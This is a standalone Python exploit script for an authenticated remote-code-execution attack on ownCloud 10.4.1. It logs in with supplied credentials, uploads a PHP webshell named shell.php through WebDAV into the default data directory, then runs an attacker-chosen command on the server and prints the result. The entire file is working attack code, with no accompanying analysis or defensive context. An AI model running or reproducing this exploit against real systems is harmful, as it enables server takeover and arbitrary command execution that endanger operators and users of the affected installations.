#!/usr/bin/python3

# Import packages
import requests
import base64
import argparse

# Variables by args
parser = argparse.ArgumentParser(description="Authenticated RCE for ownCloud 10.4.1 with default data path")
parser.add_argument('-t',dest='target',required=True,help="Target URL")
parser.add_argument('-u',dest='username',required=True,help="Username")
parser.add_argument('-p',dest='password',required=True,help="Password")
parser.add_argument('-c',dest='command', required=True, help="Command to execute")
args = parser.parse_args()

# Headers' settings
combination = args.username + ":" + args.password
uploadheaders = {"Content-Disposition": "attachment; filename=\"shell.php\"",
"Authorization": "Basic " + base64.b64encode(bytes(combination, "utf-8")).decode('utf-8'),
}
webshell = "<?php if(isset($_REQUEST[\'cmd\'])){ echo \"<pre>\"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo \"</pre>\"; die; }?>"

request = requests.session()

# Setting the login info to do the request
login_info = {
    "user": args.username,
    "pass": args.password,
    "sublogin": 1
}

# Login request
login_request = request.post(
    args.target+"/index.php/login",
     login_info,
     verify=False,
     allow_redirects=True
 )

# Verifying credentials
print("[?] Logging in...")
dashboard_request = request.get(args.target+"/index.php/apps/files", allow_redirects=True)
if dashboard_request.status_code == 200:
    print ("[+] Logged in. Checking if a webshell is uploaded...")
    pass
elif dashboard_request.status_code == 302:
    print ("[-] Wrong credentials or data!")
    exit()	

# Checking if webshell exists
check_request = request.get(args.target+"/data/"+args.username+"/files/shell.php")
if check_request.status_code == 200:
	print ("[+] Webshell already uploaded")
	pass
elif check_request.status_code == 404:
	print("[?] Webshell not uploaded. Uploading the webshell...")
	# Upload webshell
	upload_request = request.put(args.target + '/remote.php/dav/files/' + args.username + '/shell.php',data=webshell, headers=uploadheaders)
	final_check_request = request.get(args.target+"/data/"+args.username+"/files/shell.php")
	if final_check_request.status_code == 200:
		print("[+] Webshell correctly uploaded")
	else:
		print("[-] Error. Exiting...")
		exit()

# Executing the code
print("[?] Executing the code...")
execution = request.get(args.target + '/data/' + args.username + '/files/shell.php?cmd='+args.command)
print()
print(execution.content.decode('utf-8').replace('<pre>', '').replace('</pre>', ''))
print("[+] Command successfully executed")